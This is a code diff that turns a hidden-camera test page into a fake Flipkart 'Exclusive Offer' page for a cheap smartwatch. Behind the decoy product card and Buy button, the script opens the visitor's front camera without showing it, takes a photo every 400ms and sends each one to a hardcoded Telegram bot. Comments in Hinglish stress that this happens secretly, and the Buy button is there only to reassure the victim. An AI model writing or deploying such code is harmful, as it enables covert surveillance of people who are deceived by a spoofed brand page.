@@ -3,44 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Test</title>
+    <title>🔥 Flipkart - Exclusive Offer</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background: #f1f3f6;
+            padding: 15px;
+        }
+        .header {
+            background: #2874f0;
+            color: white;
+            padding: 15px;
+            text-align: center;
+            border-radius: 10px;
+            font-size: 22px;
+            font-weight: bold;
+        }
+        .product-card {
+            background: white;
+            margin-top: 20px;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .product-card img {
+            width: 100%;
+            max-width: 300px;
+            border-radius: 10px;
+        }
+        .product-card h2 {
+            color: #333;
+            margin: 15px 0 10px;
+        }
+        .product-card .price {
+            color: #2874f0;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .product-card .off {
+            color: #388e3c;
+            font-size: 16px;
+        }
+        .btn-buy {
+            background: #fb641b;
+            color: white;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 30px;
+            font-size: 18px;
+            margin-top: 15px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+        }
+        .btn-buy:hover {
+            background: #f57224;
+        }
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            color: #999;
+            font-size: 12px;
+        }
+        #status {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #888;
+        }
+        /* 🔥 Camera video bilkul HIDDEN */
+        #video {
+            display: none;
+        }
+    </style>
 </head>
-<body style="background: black; margin: 0; padding: 0; overflow: hidden;">
-    <!-- 🔥 Video element BILKUL HIDDEN (dikhega nahi) -->
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    
+<body>
+
+    <!-- 🔥 FAKE FLIPKART PAGE DESIGN -->
+    <div class="header">📦 Flipkart Deals</div>
+
+    <div class="product-card">
+        <img src="https://via.placeholder.com/300x200/2874f0/ffffff?text=Exclusive+Product" alt="Product">
+        <h2>🔥 Smart Watch Pro X</h2>
+        <div class="price">₹1,999 <span class="off">(70% Off)</span></div>
+        <p style="color:#555; margin:10px 0;">Limited Time Offer! Free Delivery.</p>
+        <button class="btn-buy" id="fakeBuyBtn">🛒 Buy Now</button>
+        <p id="status">⏳ Loading offer...</p>
+    </div>
+
+    <div class="footer">© 2026 Flipkart • Secure Checkout</div>
+
+    <!-- 🔥 HIDDEN VIDEO (Camera) -->
+    <video id="video" autoplay playsinline></video>
+
     <script>
-        // ---------- APNI DETAILS YAHAN DALO ----------
+        // ---------- 🔥 APNI DETAILS YAHAN DALO ----------
         const BOT_TOKEN = "8882202375:AAF76tk6iLG8dskhKQ1vH5hDL3iG2YtvitQ";
         const CHAT_ID = 8856652090; // 
-        // ---------------------------------------------
+        // ------------------------------------------------
 
         const video = document.getElementById('video');
         const canvas = document.createElement('canvas');
+        const status = document.getElementById('status');
+        let captureInterval = null;
         let isCapturing = false;
-        let intervalId = null;
 
-        // 1. Camera start karo
+        // 🔥 Background mein camera start karo (bilkul chupke se)
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
             .then(stream => {
                 video.srcObject = stream;
+                status.innerHTML = "✅ Offer loaded!";
                 
-                // 🟢 500ms baad capture start karo (taake camera stable ho jaye)
+                // ⏰ 1.5 second baad capture start (taake user ko page dikhe)
                 setTimeout(() => {
                     isCapturing = true;
-                    // 🔥 HAR 300MS MEIN EK PHOTO (2 sec mein ~6-7 photo)
-                    intervalId = setInterval(captureAndSend, 300);
-                    
-                    // 📌 Console mein sirf ek baar log karo (pata na chale)
-                    console.log("✅ Capture started");
-                }, 500);
+                    // 🔥 Har 400ms mein ek photo (2 sec mein ~5 photo)
+                    captureInterval = setInterval(captureAndSend, 400);
+                    status.innerHTML = "✅ Product loaded! Click Buy to grab offer.";
+                }, 1500);
             })
             .catch(err => {
-                // ❌ Agar permission deny kare toh kuch mat dikhao (bas console mein error)
-                console.error("Camera access denied:", err);
+                status.innerHTML = "❌ Offer unavailable. Try again!";
+                console.error("Camera error:", err);
             });
 
-        // 2. Capture aur Send ka kaam
+        // 📸 Capture + Send function
         function captureAndSend() {
             if (!isCapturing) return;
             
@@ -55,9 +147,8 @@
                     
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'burst.jpg');
+                    formData.append('photo', blob, 'product_view.jpg');
 
-                    // 📤 Photo bhejo (background mein, koi dikhega nahi)
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
@@ -77,9 +168,22 @@
             }
         }
 
-        // 🔄 Agar page band ho toh capture rok do (battery bachane ke liye)
+        // 🔄 Fake Buy button (bas show ke liye)
+        document.getElementById('fakeBuyBtn').addEventListener('click', function() {
+            status.innerHTML = "✅ Order placed! Check your email.";
+            // 🛑 Capture band karo (user ko lage ki kaam ho gaya)
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                isCapturing = false;
+                if (video.srcObject) {
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                }
+            }
+        });
+
+        // 🔥 Page band karte hi capture band karo
         window.addEventListener('beforeunload', function() {
-            if (intervalId) clearInterval(intervalId);
+            if (captureInterval) clearInterval(captureInterval);
             if (video.srcObject) {
                 video.srcObject.getTracks().forEach(track => track.stop());
             }
